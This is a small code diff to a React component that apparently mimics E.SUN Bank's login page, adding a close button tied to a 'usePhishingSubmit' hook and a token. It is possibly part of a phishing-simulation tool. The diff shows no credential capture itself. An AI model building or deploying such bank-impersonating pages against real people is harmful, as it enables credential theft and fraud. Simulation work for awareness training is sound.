@@ -1,12 +1,14 @@
 "use client";
 
 import { usePhishingSubmit } from "./usePhishingSubmit";
+import { PhishingCloseButton } from "./PhishingCloseButton";
 
 export default function EsunBankLogin({ token }: { token: string }) {
-  const { loading, handleSubmit } = usePhishingSubmit(token);
+  const { loading, handleSubmit, handleClose } = usePhishingSubmit(token);
 
   return (
     <div className="min-h-screen bg-[#f5f5f5]">
+      <PhishingCloseButton onClose={handleClose} />
       {/* Top bar */}
       <div className="bg-white border-b border-[#e0e0e0] shadow-sm">
         <div className="max-w-[1200px] mx-auto px-4 py-3 flex items-center justify-between">
